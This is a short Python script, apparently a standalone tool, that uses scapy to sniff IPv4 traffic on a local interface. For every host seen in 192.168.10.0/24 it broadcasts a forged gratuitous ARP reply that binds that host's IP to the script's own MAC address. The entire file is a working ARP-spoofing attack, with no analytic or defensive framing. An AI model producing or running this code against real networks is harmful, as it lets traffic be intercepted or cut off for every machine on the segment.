#!/usr/bin/env python3

import ipaddress
import sys
import signal
from scapy.all import (
    ARP,
    Ether,
    sendp,
    sniff,
    IP,
    get_if_hwaddr,
    get_if_addr,
)

# ================= CONFIG =================
INTERFACE = "eth1"
ALLOWED_SUBNET = ipaddress.ip_network("192.168.10.0/24")
# ==========================================


def arp_reply(pkt):
    # Only handle IPv4 packets
    if IP not in pkt:
        return

    src_ip = pkt[IP].src

    # Ignore packets not from the allowed subnet
    if ipaddress.ip_address(src_ip) not in ALLOWED_SUBNET:
        return

    # Ignore our own traffic
    if src_ip == get_if_addr(INTERFACE):
        return

    claimed_ip = pkt[IP].src
    my_mac = get_if_hwaddr(INTERFACE)

    reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(
        op=2,  # is-at
        psrc=claimed_ip,  # IP from observed packet
        hwsrc=my_mac,
        pdst=claimed_ip,  # gratuitous ARP
        hwdst="ff:ff:ff:ff:ff:ff",
    )

    sendp(reply, iface=INTERFACE, verbose=False)
    print(f"[ARP] Sent ARP reply claiming {claimed_ip} on {INTERFACE}")


def main():
    print(f"[*] Listening on {INTERFACE}")

    def cleanup(sig, frame):
        print("\n[!] Stopping...")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    sniff(
        iface=INTERFACE,
        store=False,
        prn=arp_reply,
        filter="ip",  # BPF filter → huge performance win
    )


if __name__ == "__main__":
    main()
